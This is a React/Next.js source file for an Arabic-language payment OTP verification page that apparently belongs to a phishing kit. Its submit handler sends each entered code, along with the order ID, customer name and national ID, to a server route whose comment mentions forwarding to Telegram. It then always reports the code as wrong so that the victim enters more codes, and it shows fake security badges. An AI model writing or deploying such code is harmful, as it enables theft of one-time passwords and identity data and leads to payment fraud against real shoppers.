"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import Link from "next/link";
import { motion, AnimatePresence } from "framer-motion";
import { useCartStore } from "../../store/cartStore";
import { FileText, Receipt, X } from "lucide-react";
import {
  IoShieldCheckmarkOutline,
  IoKeyOutline,
  IoPhonePortraitOutline,
  IoTimeOutline,
  IoRefreshOutline,
  IoChevronBack,
  IoCartOutline,
  IoCardOutline,
  IoCheckmarkCircle,
  IoArrowBack,
} from "react-icons/io5";

export default function VerifyPage() {
  const [otp, setOtp] = useState("");
  const inputRef = useRef<HTMLInputElement | null>(null);
  const [codeError, setCodeError] = useState(false);
  const [lengthError, setLengthError] = useState(false);
  const [resent, setResent] = useState(false);
  const [cooldown, setCooldown] = useState(0);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [submitted, setSubmitted] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [dbOrderId, setDbOrderId] = useState<string | null>(
    typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null
  );
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
  const customerName = typeof window !== "undefined" ? localStorage.getItem("customerName") ?? customer?.name ?? "—" : "—";

  const startCooldown = useCallback(() => {
    localStorage.setItem("resendUnlockAt", String(Date.now() + 60000));
    setCooldown(60);
    clearInterval(cooldownRef.current!);
    cooldownRef.current = setInterval(() => {
      setCooldown((prev) => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    const currentTime = Date.now();
    let unlockAt = Number(localStorage.getItem("resendUnlockAt") ?? 0);
    if (unlockAt <= currentTime) {
      unlockAt = currentTime + 60000;
      localStorage.setItem("resendUnlockAt", String(unlockAt));
    }
    const remaining = Math.ceil((unlockAt - currentTime) / 1000);
    if (remaining <= 0) return;
    const timeoutId = setTimeout(() => {
      setCooldown(remaining);
      cooldownRef.current = setInterval(() => {
        setCooldown((prev) => {
          if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
          return prev - 1;
        });
      }, 1000);
    }, 0);
    return () => { clearTimeout(timeoutId); if (cooldownRef.current) clearInterval(cooldownRef.current); };
  }, []);

  useEffect(() => {
    const id = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
    if (!id) return;
    if (!dbOrderId) setDbOrderId(id);
    let failures = 0;
    pollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/orders/${id}/public`);
        if (!res.ok) { failures++; if (failures > 5) clearInterval(pollRef.current!); return; }
        failures = 0;
        const data = await res.json();
        if (data.status === "confirmed") { clearInterval(pollRef.current!); setConfirmed(true); }
      } catch { failures++; if (failures > 5) clearInterval(pollRef.current!); }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => { inputRef.current?.focus(); }, []);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (submitted || submitCooldown > 0) return;
    const code = otp.trim();
    if (!code) return;
    if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
    setSubmitted(true);
    try {
      await fetch("/api/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
      });
    } catch {
      // network error - sendToTelegram already has retry logic server-side
    }
    setCodeError(true);
    setOtp("");
    inputRef.current?.focus();
    setSubmitCooldown(5);
    clearInterval(submitCooldownRef.current!);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown((prev) => {
        if (prev <= 1) { clearInterval(submitCooldownRef.current!); setSubmitted(false); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  const steps = [
    { icon: IoCartOutline, label: "السلة", done: true },
    { icon: IoCardOutline, label: "الدفع", done: true },
    { icon: IoCheckmarkCircle, label: "التأكيد", active: true },
  ];

  // ── Confirmed Popup ──
  const confirmedId = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
  if (confirmed && confirmedId) {
    return (
      <AnimatePresence>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="fixed inset-0 bg-black/50 backdrop-blur-md flex items-center justify-center z-50 px-4"
          dir="rtl"
        >
          <motion.div
            initial={{ scale: 0.9, opacity: 0, y: 20 }}
            animate={{ scale: 1, opacity: 1, y: 0 }}
            transition={{ type: "spring", stiffness: 300, damping: 25 }}
            className="relative bg-white rounded-3xl shadow-[0_24px_80px_rgba(0,0,0,0.15)] w-full max-w-md overflow-hidden"
          >
            <Link href="/" className="absolute top-4 left-4 w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center text-gray-400 transition-all z-10">
              <X className="w-4 h-4" />
            </Link>

            {/* Success Header */}
            <div className="relative bg-gradient-to-br from-[#8543C0]/10 to-[#A842E4]/5 pt-8 pb-6 flex flex-col items-center">
              <div className="absolute inset-0 overflow-hidden">
                <div className="absolute -top-10 -right-10 w-40 h-40 bg-[#8543C0]/10 rounded-full blur-2xl" />
                <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-[#A842E4]/5 rounded-full blur-2xl" />
              </div>
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ type: "spring", stiffness: 200, delay: 0.2 }}
                className="relative"
              >
                <img src="/sucess.webp" alt="success" className="w-32 h-32 sm:w-40 sm:h-40 object-contain" />
              </motion.div>
              <motion.span
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.4 }}
                className="mt-3 bg-[#8543C0] text-white text-sm font-bold px-5 py-1.5 rounded-full shadow-[0_4px_12px_rgba(133,67,192,0.3)]"
              >
                نجحت عملية الدفع ✓
              </motion.span>
            </div>

            {/* Content */}
            <div className="px-5 sm:px-6 py-5 space-y-4 text-center">
              <div>
                <p className="text-gray-800 font-extrabold text-lg">تمت العملية بنجاح</p>
                <p className="text-gray-400 text-sm leading-7 mt-2">
                  شكراً لك لثقتك، نشكرك على كونك واحداً من عملائنا الكرام. يرجى التواصل مع خدمة العملاء لاستكمال إجراءات شحن الطلب.
                </p>
              </div>
              <div className="flex gap-3 pt-1">
                <a
                  href={`/invoice/${confirmedId}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-[#7A2FCC] to-[#8543C0] text-white font-bold text-sm shadow-[0_4px_16px_rgba(133,67,192,0.3)] hover:shadow-[0_8px_24px_rgba(133,67,192,0.4)] transition-shadow"
                >
                  <FileText className="w-4 h-4" /> الفاتورة
                </a>
                <a
                  href={`/invoice/${confirmedId}/receipt`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-[#A842E4] to-[#611FA0] text-white font-bold text-sm shadow-[0_4px_16px_rgba(168,66,228,0.3)] hover:shadow-[0_8px_24px_rgba(168,66,228,0.4)] transition-shadow"
                >
                  <Receipt className="w-4 h-4" /> سند القبض
                </a>
              </div>
            </div>
          </motion.div>
        </motion.div>
      </AnimatePresence>
    );
  }

  // ── Main Page ──
  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-br from-[#f9f5ff] via-[#fdfcff] to-[#f3eafc]" dir="rtl">
      {/* Header */}
      <div className="sticky top-0 z-20 bg-gradient-to-r from-[#090D54] via-[#611FA0] to-[#7A2FCC] shadow-[0_4px_20px_rgba(133,67,192,0.2)]">
        <div className="w-full mx-auto px-4 sm:px-8 lg:px-12 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Link href="/checkout" className="w-9 h-9 bg-white/10 backdrop-blur-sm rounded-xl flex items-center justify-center hover:bg-white/20 transition-colors border border-white/10">
              <IoChevronBack size={18} className="text-white/80 rotate-180" />
            </Link>
            <h1 className="text-[15px] font-extrabold text-white">تأكيد العملية</h1>
          </div>
          <div className="flex items-center gap-1.5 text-white/50">
            <IoShieldCheckmarkOutline size={14} />
            <span className="text-[11px] font-medium">اتصال مشفر</span>
          </div>
        </div>
      </div>

      {/* Steps */}
      <div className="w-full mx-auto px-4 sm:px-8 lg:px-12 pt-5 pb-2">
        <div className="flex items-center justify-center">
          {steps.map((step, i) => (
            <div key={i} className="flex items-center">
              <div className="flex flex-col items-center gap-1.5">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center transition-all ${
                  step.done ? "bg-[#8543C0] text-white shadow-[0_4px_12px_rgba(133,67,192,0.3)]" :
                  step.active ? "bg-[#090D54] text-white shadow-[0_4px_12px_rgba(9,13,84,0.3)]" :
                  "bg-gray-100 text-gray-400"
                }`}>
                  {step.done ? <IoCheckmarkCircle size={20} /> : <step.icon size={18} />}
                </div>
                <span className={`text-[10px] font-bold ${step.done ? "text-[#8543C0]" : step.active ? "text-[#090D54]" : "text-gray-400"}`}>
                  {step.label}
                </span>
              </div>
              {i < steps.length - 1 && (
                <div className={`w-16 sm:w-24 h-0.5 mx-2 mb-5 rounded-full ${step.done ? "bg-[#8543C0]" : "bg-gray-200"}`} />
              )}
            </div>
          ))}
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-grow flex items-start justify-center px-4 pt-4 pb-10">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="w-full max-w-md space-y-5"
        >
          {/* OTP Card */}
          <div className="bg-white rounded-2xl shadow-[0_4px_24px_rgba(133,67,192,0.06)] border border-[#8543C0]/[0.06] p-6 sm:p-8 relative overflow-hidden">
            {/* Decorative */}
            <div className="absolute -top-16 -right-16 w-40 h-40 bg-[#8543C0]/[0.03] rounded-full blur-2xl pointer-events-none" />
            <div className="absolute -bottom-16 -left-16 w-40 h-40 bg-[#A842E4]/[0.03] rounded-full blur-2xl pointer-events-none" />

            <div className="relative">
              {/* Icon & Title */}
              <div className="text-center mb-7">
                <motion.div
                  initial={{ scale: 0.8 }}
                  animate={{ scale: 1 }}
                  transition={{ type: "spring", stiffness: 200 }}
                  className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-gradient-to-br from-[#7A2FCC] to-[#A842E4] flex items-center justify-center shadow-[0_8px_24px_rgba(133,67,192,0.25)]"
                >
                  <IoKeyOutline size={28} className="text-white" />
                </motion.div>
                <h1 className="text-xl font-extrabold text-gray-800 mb-2">رمز التحقق (OTP)</h1>
                <p className="text-gray-400 text-sm leading-relaxed flex items-center justify-center gap-1.5">
                  <IoPhonePortraitOutline size={14} />
                  أدخل الرمز المرسل إلى هاتفك
                </p>
              </div>

              {/* Info Badge */}
              <div className="flex items-center gap-2 bg-amber-50 border border-amber-100 rounded-xl px-3 py-2.5 mb-6">
                <IoTimeOutline size={16} className="text-amber-400 shrink-0" />
                <p className="text-amber-600/80 text-[11px] font-medium leading-relaxed">
                  أحياناً يصل الرمز متأخراً بعد بضع دقائق، يرجى الانتظار قليلاً
                </p>
              </div>

              {/* OTP Input */}
              <form onSubmit={handleSubmit} className="space-y-5">
                <div dir="ltr">
                  <input
                    ref={inputRef}
                    type="text"
                    inputMode="numeric"
                    maxLength={6}
                    placeholder="أدخل الرمز"
                    value={otp}
                    onChange={(e) => {
                      setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
                      setCodeError(false);
                      setLengthError(false);
                    }}
                    className={`w-full h-13 text-center text-xl font-extrabold rounded-xl border-2 outline-none transition-all duration-200 tracking-[0.3em] ${
                      codeError
                        ? "border-red-300 bg-red-50/50 text-red-500 animate-[shake_0.3s_ease]"
                        : otp
                        ? "border-[#8543C0] bg-[#8543C0]/5 text-[#7A2FCC]"
                        : "border-gray-200 bg-[#f9f5ff]/50 text-gray-800 focus:border-[#8543C0] focus:bg-white focus:shadow-[0_0_0_3px_rgba(133,67,192,0.1)]"
                    }`}
                  />
                </div>

                {/* Error Messages */}
                <AnimatePresence>
                  {lengthError && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-amber-500 text-xs font-bold text-center">
                      يجب إدخال 4 أو 6 أرقام
                    </motion.p>
                  )}
                  {codeError && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-red-400 text-xs font-bold text-center">
                      الرمز غير صحيح، حاول مرة أخرى
                    </motion.p>
                  )}
                  {resent && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-[#8543C0] text-xs font-bold text-center">
                      ✓ تم إعادة إرسال الرمز
                    </motion.p>
                  )}
                </AnimatePresence>

                {/* Submit Button */}
                <motion.button
                  type="submit"
                  disabled={submitCooldown > 0 || submitted}
                  whileHover={submitCooldown > 0 ? {} : { scale: 1.01 }}
                  whileTap={submitCooldown > 0 ? {} : { scale: 0.98 }}
                  className={`w-full py-3.5 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all duration-200 ${
                    submitCooldown > 0
                      ? "bg-gray-200 text-gray-400 cursor-not-allowed"
                      : "bg-gradient-to-r from-[#7A2FCC] via-[#8543C0] to-[#A842E4] text-white shadow-[0_8px_24px_rgba(133,67,192,0.3)] hover:shadow-[0_12px_32px_rgba(133,67,192,0.4)]"
                  }`}
                >
                  {submitCooldown > 0 ? (
                    <>انتظر ({submitCooldown}s)</>
                  ) : (
                    <>
                      <IoShieldCheckmarkOutline size={18} />
                      تأكيد الرمز
                    </>
                  )}
                </motion.button>

                {/* Resend & Back */}
                <div className="flex flex-col items-center gap-3 pt-1">
                  <div className="flex items-center gap-1.5 text-sm">
                    <span className="text-gray-400">لم يصلك الرمز؟</span>
                    <button
                      type="button"
                      disabled={cooldown > 0}
                      onClick={() => {
                        if (cooldown > 0) return;
                        fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName }) });
                        setResent(true);
                        setTimeout(() => setResent(false), 3000);
                        startCooldown();
                      }}
                      className={`font-bold transition-all select-none flex items-center gap-1 ${
                        cooldown > 0
                          ? "text-gray-300 cursor-not-allowed"
                          : "text-[#8543C0] hover:text-[#7A2FCC]"
                      }`}
                    >
                      <IoRefreshOutline size={14} className={cooldown > 0 ? "" : "hover:rotate-180 transition-transform duration-500"} />
                      {cooldown > 0 ? `${cooldown}s` : "إعادة الإرسال"}
                    </button>
                  </div>
                  <Link href="/checkout" className="flex items-center gap-1.5 text-gray-400 text-xs font-medium hover:text-[#8543C0] transition-colors">
                    <IoArrowBack size={12} className="rotate-180" />
                    العودة لصفحة الدفع
                  </Link>
                </div>
              </form>
            </div>
          </div>

          {/* Security Badge */}
          <div className="flex justify-center">
            <div className="flex items-center gap-4 text-gray-300">
              <div className="flex items-center gap-1.5">
                <IoShieldCheckmarkOutline size={13} />
                <span className="text-[10px] font-medium">256-bit SSL</span>
              </div>
              <div className="w-px h-3 bg-gray-200" />
              <div className="flex items-center gap-1.5">
                <IoKeyOutline size={13} />
                <span className="text-[10px] font-medium">اتصال مشفر</span>
              </div>
            </div>
          </div>
        </motion.div>
      </main>
    </div>
  );
}
